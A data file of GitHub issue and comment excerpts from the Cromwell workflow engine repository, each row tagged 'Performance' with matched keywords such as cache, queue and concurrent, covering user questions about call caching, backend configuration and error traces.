Performance,"Hi, . I have a question/require help. When implementing call caching and using a scatter, if a task/shard fails does cromwell restart then entire task?. Example. I am running ~200 alignments creating ~200 bam files, rather large ones, say if 190 complete and the last one fails, when I restart I am seeing that the entire 200 bam alignments are run again. Is it possible to have cromwell's call caching resume after the 190 completed alignments as opposed to rerunning them?. Has anyone come across this? I am thinking it might be possible using the following parameters. 1. - ContinueWhilePossible = true; 2. - System.file-hash-cache = true; 3. - System.graceful-server-shutdown = true. We are currently trying this but I wanted to see if anyone has come across this as well?. Thanks for your help!",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5966:629,cache,cache,629,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5966,1,['cache'],['cache']
Performance,"Hi, . I was wondering if I could submit a patch to Cromwell to support Broad's internal queue UGER, . Currently, the GridEngine job submission backend (qsub) for Cromwell doesn't take a queue argument (-q) nor a project id (-P); both of these arguments are necessary for my group to be able to submit jobs to UGER queue successfully. . I realize that I'm submitting this patch under 0.19_hotfix and not dev branch; and also not sure how the Cromwell team wants to organize the application.conf file to accommodate UGER arguments. . So putting this forth initial pull request to get feedback/instructions to add this patch, . Thanks,; Paul",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/875:88,queue,queue,88,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/875,3,['queue'],['queue']
Performance,"Hi, I am using cromwell-59.jar, and run in local backend mode. ; Used command:; `java -Dconfig.file=cromwell.examples.conf -jar ~/softwares/cromwell-59.jar run example.wdl -i input_detail.json`. however, when I try to re-run a successed workflow to validate the cache calling function, I got the following information that confused me. very much. Would you be kind to give me some ideas on what's going on? . `a588e03e-a4fc-4809-b5f5-bb540cac9ca3-EngineJobExecutionActor-rnaseq_pipeline.fastp:NA:1 [UUID(a588e03e)]: Could not copy a suitable cache hit for a588e03e:rnaseq_pipeline.fastp:-1:1. No copy attempts were made.`. following is the source code related I fetched, but still cannot understand it. `if (data.cacheHitFailureCount > 0) {; val totalHits = data.cacheHitFailureCount; val copyFails = data.failedCopyAttempts; val blacklisted = totalHits - copyFails; workflowLogger.info(; s""Could not copy a suitable cache hit for $jobTag. "" +; s""EJEA attempted to copy $totalHits cache hits before failing. "" +; s""Of these $copyFails failed to copy and $blacklisted were already blacklisted from previous attempts). "" +; s""Falling back to running job.""; ); val template = s""BT-322 {} cache hit copying failure: {} failed copy attempts of maximum {} with {}.""; log.info(template, jobTag, data.failedCopyAttempts, callCachingParameters.maxFailedCopyAttempts, data.aggregatedHashString); } ; else {; log.info(s""BT-322 {} cache hit copying nomatch: could not find a suitable cache hit."", jobTag); workflowLogger.info(""Could not copy a suitable cache hit for {}. No copy attempts were made."", jobTag); }`",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6484:262,cache,cache,262,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6484,10,['cache'],"['cache', 'cacheHitFailureCount']"
Performance,"Hi, I this is might be a little late, but I am having this issue too when running using Batch. I configured my core environment on my own (without using the CF templates). I have a bucket that is located in `us-west-2` and the instance running Cromwell (v59), and the Job Queue are located in `us-east-2`. When I run a job, I get the same error that @illusional was getting.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4731#issuecomment-927177699:272,Queue,Queue,272,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4731#issuecomment-927177699,1,['Queue'],['Queue']
Performance,"Hi, I've been running Cromwell with the file-based DB fine for a few weeks, but today had a seemingly unrelated problem and this seems to have corrupted the DB. Potentially unrelated error:; ```; akka.pattern.AskTimeoutException: Ask timed out on [Actor[akka://cromwell-system/user/cromwell-service/WorkflowStoreCoo; rdinatedAccessActor#1289452983]] after [60000 ms]. Message of type [cromwell.engine.workflow.workflowstore.WorkflowStor; eCoordinatedAccessActor$FetchStartableWorkflows]. A typical reason for `AskTimeoutException` is that the recipient acto; r didn't send a reply.; at akka.pattern.PromiseActorRef$.$anonfun$defaultOnTimeout$1(AskSupport.scala:675); at akka.pattern.PromiseActorRef$.$anonfun$apply$1(AskSupport.scala:696); at akka.actor.Scheduler$$anon$4.run(Scheduler.scala:202); at scala.concurrent.Future$InternalCallbackExecutor$.unbatchedExecute(Future.scala:875); at scala.concurrent.BatchingExecutor.execute(BatchingExecutor.scala:113); at scala.concurrent.BatchingExecutor.execute$(BatchingExecutor.scala:107); at scala.concurrent.Future$InternalCallbackExecutor$.execute(Future.scala:873); at akka.actor.LightArrayRevolverScheduler$TaskHolder.executeTask(LightArrayRevolverScheduler.scala:334); at akka.actor.LightArrayRevolverScheduler$$anon$3.executeBucket$1(LightArrayRevolverScheduler.scala:285); at akka.actor.LightArrayRevolverScheduler$$anon$3.nextTick(LightArrayRevolverScheduler.scala:289); at akka.actor.LightArrayRevolverScheduler$$anon$3.run(LightArrayRevolverScheduler.scala:241); at java.base/java.lang.Thread.run(Thread.java:834); ```. Error that I receive now when I try to start Cromwell:. ```; 2020-05-05 15:31:33,773 INFO - dataFileCache commit start; 2020-05-05 15:33:32,400 ERROR - Failed to instantiate Cromwell System. Shutting down Cromwell.; java.sql.SQLTransientConnectionException: db - Connection is not available, request timed out after 121641ms.; at com.zaxxer.hikari.pool.HikariPool.createTimeoutException(HikariPool.java:676); at com.zaxxer.h",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-623865649:807,concurren,concurrent,807,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-623865649,3,['concurren'],['concurrent']
Performance,"Hi, is it possible to invalidate cache with timeout? I am asking because we do not keep the results of calls infinitely, only for 6 weeks. I assume that cache will be kept in DB and call will try to copy a directory that is corrupted (we delete files but not directory structure). Otherwise we would have to access DB and remove calls manually. Rafal",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5174:33,cache,cache,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5174,2,['cache'],['cache']
Performance,"Hi,. I am trying to run cromwell (version 51) with slurm backend and AWS RDS (postgres) as the database. After the workflow is successful, I am receiving the following warning :; `SingleWorkflowRunnerActor: received unexpected message: QueueWeight(0) of type cromwell.core.actor.BatchActor.QueueWeight in state RequestingOutputs`. Can you tell me why this warning is caused and how to fix it?. Thanks",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5838:236,Queue,QueueWeight,236,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5838,2,['Queue'],['QueueWeight']
Performance,"Hi,. I am wondering if there was progress made on that issue? . Running GATK pipelines uses a lot of disk space for intermediate (bam) files, which is problematic for large cohorts. It seems that removing those files before the pipeline complete would break the Cromwell cache.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3881#issuecomment-620049532:271,cache,cache,271,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3881#issuecomment-620049532,1,['cache'],['cache']
Performance,"Hi,. I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch; Cromwell version: 51; Error log:. Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; nmerged.bam)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977:38,cache,cache,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977,7,"['Cache', 'cache', 'tune']","['Cache', 'cache', 'cacheCopy', 'tune']"
Performance,"Hi,. I have built a WDL workflow which works well with SLURM but now I am trying to get it to be able to be run on a standalone server. . I have Slurm as my provider and have created one for Local. ` Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {. run-in-background = true; exit-code-timeout-seconds = 300; workflow-reset = true; read_from_cache = true; write_to_cache = true; system.file-hash-cache=true; concurrent-job-limit = 2. runtime-attributes = """"""; String head_directory = ""/data/MGP""; String singularity_image = ""/data/MGP/sing/metaGenPipe.simg""; """""". submit = ""singularity run -B ${head_directory}:${head_directory} ${singularity_image} /bin/bash ${script}"". filesystems {; local {; localization: [; ""soft-link"", ""hard-link"", ""copy""; ]; } ## end local; } ## end file systems; } ## end config; } ## End Local`. Oddly, when running the workflow I get a submit docker error. ie. as per below. I have no idea why it's looking for docker as I'm not knowingly using it. I'm not using docker in my run time parameters. I have been able to get standalone working on another workflow by passing a singularity container to each task command output but I was wondering if there was a more elegant solution I could use such as just changing to a pre-made provider. I have searched Google and through here but not found anything. I did find one issue here but they seemed to want to use docker where as I don't. . Thanks for the help!. `task submit {. String job_id; String job_name; String cwd; String out; String err; String script; String job_shell. String head_directory = ""/data/MGP""; String singularity_image = ""/data/MGP/sing/metaGenPipe.simg"". command {; singularity run -B ${head_directory}:${head_directory} ${singularity_image} /bin/bash ${script}; }; }. task submit_docker {. String job_id; String job_name; String cwd; String out; String err; String script; String job_shell. String docker_cwd; String docker_cid; String docker_scri",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862:452,cache,cache,452,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862,2,"['cache', 'concurren']","['cache', 'concurrent-job-limit']"
Performance,"Hi,. I have set up a Cromwell platform on AWS batch according to https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/. If I run GATK Best Practice pipeline for one sample, it works perfectly. However, when I ran this pipeline for 10+ samples concurrently, many AWS EC2 instances were re-used by AWS batch. Cromwell didn't clean up the localized S3 files and output files produced by previous tasks. This quickly inflated EBS cost when EBS autoscaling is enabled. One of my instances went up to 9.1TB and hit the upper bound for autoscaling, then the running task failed due to no space. . I have checked Cromwell documents and some materials from AWS, as well as issue #4323. But none of them works for me. Thank you in advance for any suggestions.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5974:276,concurren,concurrently,276,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974,1,['concurren'],['concurrently']
Performance,"Hi,. I just moved to a new cluster (no sudo) and try to run a WDL script with Cromwell-31.; Everything worked fine on my previous cluster (same Cromwell / WDL / Java versions and same script). After creating the wdl script, I validated it and generated a JSON file (with wdl-0.14), no problem. After running `java -jar cromwell-31.jar run my_script.wdl -i my_script.JSON` the workflow stops, outputting `Permission denied` for the program I call in my .wdl script (which is called from the 'cromwell_executions' folder during the process). I changed the permission to 777 for this program located in my `/usr/bin`, but still the same issue. The program, once located in the 'cromwell_executions' folder, loses the execution permission for the owner.; Same issue no matter if I submit a PBS job or run it interactively. Is there anything to mention in a cromwell configuration file or something to tune in the cluster?. Thanks !",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3500:897,tune,tune,897,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3500,1,['tune'],['tune']
Performance,"Hi,. In Cromwell 52 we updated the S3 module to perform multithreaded, multipart; copies to improve the size of results that may be cached. There are also; additional improvements that have recently been merged into dev and should; appear in the next release version (or you could build from source). v52+ requires a new AWS configuration. Instructions are in; https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf. On Sat, Oct 24, 2020 at 8:27 PM Luyu <notifications@github.com> wrote:. > Hi,; >; > I got a timeout exception during cache copying on AWS S3. The cache file; > size is 133GB. Given the file size, more time should be allowed for cache; > copying. Is there any config option that can tune this? Thank you in; > advance for any suggestions.; >; > Backend: AWS Batch; > Cromwell version: 51; > Error log:; >; > Failure copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed; > out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; >; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; >; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam); >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5977>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310:48,perform,perform,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310,9,"['Cache', 'cache', 'perform', 'tune']","['Cache', 'cache', 'cacheCopy', 'cached', 'perform', 'tune']"
Performance,"Hi,. The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? . > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491:141,cache,cached,141,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491,5,"['cache', 'perform']","['cache', 'cached', 'perform']"
Performance,"Hi,. We would like to optimize our workflows to make use of local SSD on our HPC compute nodes to minimize iow. Is it possible to run subworkflows in ""local"" backend mode, but then all other tasks in the main workflow as individual SGE jobs? For example, we might want to run Fastq through HaplotypeCaller for an individual sample on the same compute node as a sub workflow to make use of the local SSD for intermediate files and then copy final result to shared storage. These sub workflows would be scattered among samples in our batch. Once the scatter (all samples) is completed, then a new subworkflow is called, again to a single compute node ""local"" backend mode which would run a joint genotype through filter/annotation steps with a copy of final results to shared storage (but any intermediates would be to the local SSD). We are considering a single SGE job per sample dispatched to take the sequencing data through data preprocessing and variant discovery, then a new SGE job to do joint genotyping (for all samples in the batch) and annotation, etc. Would something like this be possible/recommended? I also posted this in the WDL forum - didn't know where best to post this question. Thanks much for your time and thoughts.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3507:22,optimiz,optimize,22,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3507,1,['optimiz'],['optimize']
Performance,"Hi,. _I'll manually synchronise this issue with Jira, I've raised it here as I think it has better exposure, might be useful as a reference and I'm going to reference it from a different issue: https://broadworkbench.atlassian.net/browse/BA-6172_. I'm trying to get call-caching working for my workflows, and having some trouble identifying a config that will work for the following requirements:. - Using containers (both Singularity and Docker); - Initial localisation strategy: `[hard-link, cached-copy]`; - Local SFS environment; - My input files can be fairly large (~250GB per Bam with up to 16 Bams). . If I can get this working, I'll happily document and update the CallCaching documentation page with what I've found. ## Background information. Version: Cromwell-47. Documentation:; - https://cromwell.readthedocs.io/en/stable/cromwell_features/CallCaching/; - https://cromwell.readthedocs.io/en/stable/Configuring/#local-filesystem-options; - https://cromwell.readthedocs.io/en/stable/backends/HPC/#shared-filesystem. Cache duplication strategies:; - `hard-link`; - `soft-link` - This strategy is not applicable for tasks which specify a Docker image and will be ignored.; - `copy`; - ~`cached-copy`~ - This is non-cache duplication strategy. Cache hashing strategies:; - `file` - (default) computes an md5 hash of the file content. [Code: `tryWithResource(() => file.newInputStream) { DigestUtils.md5Hex }`]; - `path` - computes an md5 hash of the file path. This strategy will only be effective if the duplication-strategy (above) is set to ""soft-link"".; - `path+modtime` - compute an md5 hash of the file path and the last modified time. The same conditions as for ""path"" apply here. [Code: `md5Hex(file.toAbsolutePath.pathAsString + file.lastModifiedTime.toString)`]. Other caching options:. - `system.file-hash-cache` - Prevent repeatedly requesting the hashes of the same files multiple times. - `backend.providers.Local.caching.check-sibling-md5` - will check if a sibling file with t",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5346:494,cache,cached-copy,494,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5346,1,['cache'],['cached-copy']
Performance,"Hi,; I am working with version 52. I have cache enabled. When the cache is triggered stdout and stderr are copied to the `shard-0/cacheCopy/execution/stdout` directory. However, in the metadata it appears as `shard-0/execution/stdout` that does not exists (which destroys our interface). Should the path in the metadata point to an existing file?. Best,; Rafal",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5818:42,cache,cache,42,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5818,3,['cache'],"['cache', 'cacheCopy']"
Performance,"Hi,; Kate brought me here by this thread in the [forum](https://gatkforums.broadinstitute.org/wdl/discussion/10296/prioritize-workflows-which-are-allready-in-server-queue#latest) . It mostly covers the features @kcibul already requested. In addition, I would like to have an API command which forces a workflow directly to start by sending an actual running workflow to sleep/ pause. Maybe this could go hand in hand with call-caching for the sleeping workflow?. Greetings Selonka / EADG",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1566#issuecomment-327723019:165,queue,queue,165,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1566#issuecomment-327723019,2,['queue'],['queue']
Performance,"Hi. I'm trying to enable call caching using a local file database and I can't seem to get it to work. Everything that I try does not seem to make a difference, and each run always starts from the first task. I'm running cromwell in run mode from the command line, and I am testing on both cromwell 43 and cromwell 47. I also have write-to-cache and read-from-cache set to true in my options.json (although I understand that is the default behaviour). I am unable to use a mySQL or postgres database at this current time. Is there something that I'm missing? Is there any additional information that is needed to help diagnose this?. My cromwell.conf is as follows:. backend {; default = LSF; providers {; LSF {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; exit-code-timeout-seconds = 600. runtime-attributes = """"""; Int cpus; Float memory_mb; String lsf_queue; String lsf_project; """""". submit = """"""; bsub \; -q ${lsf_queue} \; -P ${lsf_project} \; -J ${job_name} \; -cwd ${cwd} \; -o ${out} \; -e ${err} \; -n ${cpus} \; -R rusage[mem=${memory_mb}] \; /usr/bin/env bash ${script}; """""". job-id-regex = ""Job <(\\d+)>.*"". kill = ""bkill ${job_id}""; check-alive = ""bjobs ${job_id}"". filesystems {; local {; localization: [; ""soft-link"", ""copy"", ""hard-link""; ]; caching {; duplication-strategy: [; ""soft-link"", ""copy"", ""hard-link""; ]; hashing-strategy: ""path""; }; }; }; }; }; }; }; call-caching {; enabled = true; invalidate-bad-cache-results = true; }; database {; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; url = """"""; jdbc:hsqldb:file:cromwell-executions/cromwell-db/cromwell-db;; shutdown=false;; hsqldb.default_table_type=cached;hsqldb.tx=mvcc;; hsqldb.result_max_memory_rows=100000;; hsqldb.large_data=true;; hsqldb.applog=1;; hsqldb.lob_compressed=true;; hsqldb.script_format=3; """"""; connectionTimeout = 86400000; numThreads = 1; }; }",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5370:339,cache,cache,339,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5370,4,['cache'],"['cache', 'cache-results', 'cached']"
Performance,"Hi;; I'm running Cromwell 34 and hitting an issue when reading from a cache. The problematic CWL step uses a variable, `min_allele_fraction` that is initially an array of longs:. https://github.com/bcbio/test_bcbio_cwl/blob/eae685b8023126b7f159d3048f4ab4dd1a1833d6/prealign/prealign-workflow/steps/batch_for_variantcall.cwl#L101. and then gets converted into a record with individual long elements:. https://github.com/bcbio/test_bcbio_cwl/blob/eae685b8023126b7f159d3048f4ab4dd1a1833d6/prealign/prealign-workflow/steps/batch_for_variantcall.cwl#L309. This all works fine on the first run of a pipeline, but when reading the step from the cache we get an error about not supporting `Long`:; ```; [2018-08-21 10:26:40,02] [info] WorkflowExecutionActor-3e76006c-870a-4c34-9f21-949eee1a5b33 [3e76006c]: Starting batch_for_variantcall; [2018-08-21 10:26:41,10] [error] unrecognized simpleton WOM type: Long; java.lang.RuntimeException: unrecognized simpleton WOM type: Long; at cromwell.Simpletons$.toSimpleton(Simpletons.scala:30); at cromwell.Simpletons$.toSimpleton(Simpletons.scala:16); at cromwell.engine.workflow.lifecycle.execution.callcaching.FetchCachedResultsActor.$anonfun$new$2(FetchCachedResultsActor.scala:32); at scala.collection.TraversableLike.$anonfun$map$1(TraversableLike.scala:234); at scala.collection.Iterator.foreach(Iterator.scala:944); at scala.collection.Iterator.foreach$(Iterator.scala:944); at scala.collection.AbstractIterator.foreach(Iterator.scala:1432); at scala.collection.IterableLike.foreach(IterableLike.scala:71); at scala.collection.IterableLike.foreach$(IterableLike.scala:70); at scala.collection.AbstractIterable.foreach(Iterable.scala:54); at scala.collection.TraversableLike.map(TraversableLike.scala:234); at scala.collection.TraversableLike.map$(TraversableLike.scala:227); at scala.collection.AbstractTraversable.map(Traversable.scala:104); at cromwell.engine.workflow.lifecycle.execution.callcaching.FetchCachedResultsActor.$anonfun$new$1(FetchCachedResults",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4023:70,cache,cache,70,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4023,2,['cache'],['cache']
Performance,"Hint: these are barely changed from the draft-2 versions. ; You probably only *need* to review the `.scala` changes, although obviously another pair of eyes on the call cache capoeira tests never hurt. I made a mistake - no red thumb is required now but a red thumb is of course always welcome...",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3653:169,cache,cache,169,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3653,1,['cache'],['cache']
Performance,"Hm. This looks like a conf bug on our side, but [is your config file importing application.conf](https://cromwell.readthedocs.io/en/stable/tutorials/ConfigurationFiles/#creating-your-first-configuration-file)? That file contains other overrides that cromwell should have over the default `akka` configuration. The bug here is that application.conf is only supposed to contain overrides, while reference.conf should contain newly defined resources. Since the `services` block are cromwell's services, they should be newly defined in reference.conf. That would then allow anyone who accidentally doesn't pick up our application.conf to *at least* have the reference `services`, plus the original `akka` values with degraded cromwell performance.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4577#issuecomment-457755274:731,perform,performance,731,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4577#issuecomment-457755274,1,['perform'],['performance']
Performance,"Hmm . concurrent tests =>; concurrent ServiceRegistryActors =>; concurrent EngineMetadataServiceActors =>; concurrent MetadataSummaryRefreshActors. The system was meant to have only a single MetadataSummaryRefreshActor running, so this might introduce weirdness.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1060#issuecomment-228141897:6,concurren,concurrent,6,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1060#issuecomment-228141897,4,['concurren'],['concurrent']
Performance,"Hmm that is definitely different from the ""task rejected from queue"" errors. And anyway 28 has the larger default metadata batch size changes, so if this really was a different symptom of that problem it shouldn't be happening on 28. . I don't see much different between develop and 28_hotfix that could legitimately explain fixes in the vicinity of Slick. 😕",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2447#issuecomment-315451894:62,queue,queue,62,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2447#issuecomment-315451894,1,['queue'],['queue']
Performance,"Hmm we would still need to cache at least the ""unevaluated expression"" I think, whatever that means. Otherwise what about this : . ```; task t1 {; String a; String b = ""hello"" + a; command {; echo ${b}; }; }. task t1 {; String a; String b = a + ""hello""; command {; echo ${b}; }; }. workflow w {; call t1 { input: a = ""a"" }; call t2 { input: a = ""a"" }; }; ```. Same input / command but the result will be different.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2309#issuecomment-306065035:27,cache,cache,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2309#issuecomment-306065035,1,['cache'],['cache']
Performance,Hmm yeah you're right. Scrolling up it looks like this ticket was referencing hotfix and not develop. And yeah we're not even trying to load this key on develop so Cromwell certainly shouldn't fail for its absence.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/845#issuecomment-224691653:136,load,load,136,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/845#issuecomment-224691653,1,['load'],['load']
Performance,"Hmm, that's interesting on the google side. So I'm clear you're saying that Cromwell is showing Running when they were not in Google? If so, how long did that stay the case - was it in perpetuity? I ask because as the number of jobs increases the average latency between a state change on Google's side and Cromwell detecting it increases due to QPS limitations. We're always trying to work with them to find ways to make that faster but we're limited on how many things we can query about at once, so we round robin them through. As an example the other day I submitted 200k single call workflows which each only slept for a couple of seconds but it took upwards of an hour for Cromwell to know that everything was complete due to that. I'm still going to look into the root cause of the exceptions you saw, i've been seeing those a lot myself (but had reason to believe it was an artifact of my not-at-all-standard setup, glad you chimed in to fix that for me) and wanted to make sure they weren't masking something more fundamentally wrong. re the logging aspect, I agree completely - this has always been an issue and is growing the more the people start adopting Cromwell. I found it amusing that just hours prior I said I should change that one to be less frightening and then it frightened someone ;) In general I think that logging is always a a dark art but answering the ""who is the log for?"" is even harder here as we intentionally designed cromwell to satisfy multiple use cases all of whom have different things they want to see. It's something that we're looking to work on over the next several months.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260127711:255,latency,latency,255,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260127711,2,['latency'],['latency']
Performance,"Hog factor, and concurrent jobs",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4013:16,concurren,concurrent,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4013,1,['concurren'],['concurrent']
Performance,How do I set docker hash with cache calls?,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6933:30,cache,cache,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6933,1,['cache'],['cache']
Performance,How was the performance impact of this tested?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4087#issuecomment-420502738:12,perform,performance,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4087#issuecomment-420502738,1,['perform'],['performance']
